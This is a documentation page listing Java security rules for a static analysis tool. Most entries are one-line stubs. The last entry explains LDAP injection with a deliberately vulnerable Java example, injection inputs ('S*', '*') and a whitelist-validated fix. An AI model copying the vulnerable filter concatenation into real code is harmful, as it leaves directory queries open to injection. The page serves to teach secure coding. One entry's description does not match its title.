
<!DOCTYPE html>
<html lang="en">

<head>
    <link href='../../theme/fonts/googleapis.css' rel='stylesheet' type='text/css'>
    <link href="../../theme/stylesheet/normalize.min.css">
    <script src="../../theme/javascript/jquery.min.js"></script>
    <script type="text/javascript" src="../../tipuesearch_content.js"></script>
    <link rel="stylesheet" href="../../theme/tipuesearch/css/tipuesearch.css">
    <script type="text/javascript" src="../../theme/tipuesearch/tipuesearch_set.js"></script>
    <script type="text/javascript" src="../../theme/tipuesearch/tipuesearch.js"></script>

        <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.css">

    <link rel="stylesheet" type="text/css"
          href="../../theme/pygments/xcode.min.css">
    <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/font-awesome.min.css">





    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>     <meta name="robots" content=""/>      <!-- Chrome, Firefox OS and Opera -->
    <meta name="theme-color" content="#333333">
    <!-- Windows Phone -->
    <meta name="msapplication-navbutton-color" content="#333333">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Microsoft EDGE -->
    <meta name="msapplication-TileColor" content="#333333">      <meta name="author" content="Pinpoint Team"/>
    <meta name="description" content="Manual and documents for Sourcebrella Pinpoint"/> <meta property="og:site_name" content="Pinpoint Document"/>
<meta property="og:type" content="blog"/>
<meta property="og:title" content="Pinpoint Document"/>
<meta property="og:description" content="Manual and documents for Sourcebrella Pinpoint"/>
<meta property="og:locale" content="en_US"/>
<meta property="og:url" content="../.."/>
 
    <title>Pinpoint Document &ndash; Category</title>

</head>

<body style="display: none;">

<aside>
    <div>
        <a href="../..">
                <img src="../../theme/img/profile.png" alt="Pinpoint Document" title="Pinpoint Document">
        </a>
        <h1><a href="../..">Pinpoint Document</a></h1>

        <div style="padding-left: 0">
            <form action="../../search.html" onsubmit="return validateForm(this.elements['q'].value);">
                <input id="tipue_search_input" type="text" name="q" placeholder="Input to search">
            </form>
        </div>


        <ul class="global_lang">
                    <li class="active"><a href="javascript:void(0);"
                                                                                  language-link="en">en</a>
                    </li>
                    <li><a href="javascript:void(0);"
                                                                                  language-link="zh">zh</a>
                    </li>
        </ul>

        <!--  -->

        <nav>
            <ul class="list">
                    <li>
                        <a href="../../standard/language-independent.html">Language Independent documents</a>
                        (3)
                    </li>
                    <li>
                        <a href="../../standard/c.html">c/c++ documents</a>
                        (317)
                    </li>
                    <li>
                        <a href="../../standard/csharp.html">csharp documents</a>
                        (39)
                    </li>
                    <li>
                        <a href="../../standard/golang.html">golang documents</a>
                        (34)
                    </li>
                    <li>
                        <a href="../../standard/java.html">java documents</a>
                        (555)
                    </li>
                    <li>
                        <a href="../../standard/javascript.html">javascript documents</a>
                        (295)
                    </li>
                    <li>
                        <a href="../../standard/objective-c.html">objective-c documents</a>
                        (124)
                    </li>
                    <li>
                        <a href="../../standard/python.html">python documents</a>
                        (618)
                    </li>
                    <li>
                        <a href="../../standard/shell.html">shell documents</a>
                        (334)
                    </li>
                    <li>
                        <a href="../../standard/swift.html">swift documents</a>
                        (26)
                    </li>

            </ul>
        </nav>

        <ul class="social">
        </ul>
    </div>


</aside>
<main>
          <article>
            <h1>
            Security issues (150)
            </h1>
        </article>
        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0145">Ant Rule9: Transaction Less Call Rollback</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Transaction Less Call Rollback</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0146">Transaction Less Rollback Type</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Transaction Less Rollback Type</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0147">Dangerous Type Amount Variable</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Dangerous Type Amount Variable</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0148">Amount Variable Cast To Dangerous Type</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Amount Variable Cast To Dangerous Type</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0149">Big Decimal Argument</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Big Decimal Argument</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0139">Weak hash</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Weak hash</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0140">Benchmark Secure Cookie</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Benchmark Secure Cookie</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0141">Error Code No Throw</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Error Code No Throw</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0142">Error Code Return Bool</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Error Code Return Bool</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0143">Error Code Return Object</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Error Code Return Object</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0144">Transaction Call Interface</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Transaction Call Interface</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0138">Benchmark Crypto</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Benchmark Crypto</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Low</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0099">Sensitive data passing into unsafe API</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Black Hole Vulnerability</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Critical</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">c</a>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0109">Fixed Key</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Fixed Key</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>High</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/c.html">c</a>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0127">Sensitive data to database</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Sensitive data to database</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Medium</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="BE0128">Sensitive data to cache</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Sensitive data to cache</p>
<h1 id="likelihood-of-exploit">Likelihood of exploit</h1>
<p>Medium</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0082">LDAP Injection Vulnerability</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 3 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The Lightweight Directory Access Protocol (LDAP) allows an application to remotely perform operations such as searching and modifying records in directories. LDAP injection results from inadequate input sanitization and validation and allows malicious users to glean restricted information using the directory service.</p>
<p>A whitelist can be used to restrict input to a list of valid characters. Characters and character sequences that must be excluded from whitelists—including Java Naming and Directory Interface (JNDI) metacharacters and LDAP special characters—are listed in the following table.</p>
<p>Characters and Sequences to Exclude from Whitelists</p>
<table>
<thead>
<tr>
<th>Character</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr>
<td>#</td>
<td>Hash character at the beginning of the string</td>
</tr>
<tr>
<td>' and "</td>
<td>Single and double quote</td>
</tr>
<tr>
<td>( and )</td>
<td>Round braces</td>
</tr>
<tr>
<td>+ and *</td>
<td>Addition and multiplication operators</td>
</tr>
<tr>
<td>, and ;</td>
<td>Comma and semicolon</td>
</tr>
<tr>
<td>/ and \</td>
<td>Forward slash and backslash</td>
</tr>
<tr>
<td>&lt; and &gt;</td>
<td>Angle brackets</td>
</tr>
<tr>
<td>\\</td>
<td>Double slashes*</td>
</tr>
<tr>
<td>\u0000</td>
<td>Unicode NULL character</td>
</tr>
<tr>
<td>space</td>
<td>Space character at beginning or end of string</td>
</tr>
<tr>
<td>This is a character sequence.</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.  </p>
<table>
<thead>
<tr>
<th>Scope</th>
<th>Impact</th>
</tr>
</thead>
<tbody>
<tr>
<td>Confidentiality</td>
<td>Technical Impact: Execute Unauthorized Code or Commands; Read Application Data; Modify Application Data</td>
</tr>
<tr>
<td>Integrity Availability</td>
<td>An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.</td>
</tr>
</tbody>
</table>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>1 Escape all variables using the right LDAP encoding function
2 Use Frameworks that Automatically Protect from LDAP Injection
3 Additional Defenses</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Critical</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>This noncompliant code example allows a caller of the method searchRecord() to search for a record in the directory using the LDAP protocol. The string filter is used to filter the result set for those entries that match a user name and password supplied by the caller.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span> 
  <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>When a malicious user enters specially crafted input, as outlined previously, this elementary authentication scheme fails to confine the output of the search query to the information for which the user has access privileges.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>This compliant solution uses a whitelist to sanitize user input so that the filter string contains only valid characters. In this code, userSN may contain only letters and spaces, whereas a password may contain only alphanumeric characters.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<p>When a database field such as a password must include special characters, it is critical to ensure that the authentic data is stored in sanitized form in the database and also that any user input is normalized before the validation or comparison takes place. Using characters that have special meanings in JNDI and LDAP in the absence of a comprehensive normalization and whitelisting-based routine is discouraged. Special characters must be transformed to sanitized, safe values before they are added to the whitelist expression against which input will be validated. Likewise, normalization of user input should occur before the validation step.</p>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CEW">
<p>http://cwe.mitre.org/data/definitions/116.html <a class="footnote-backref" href="#fnref-CEW" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
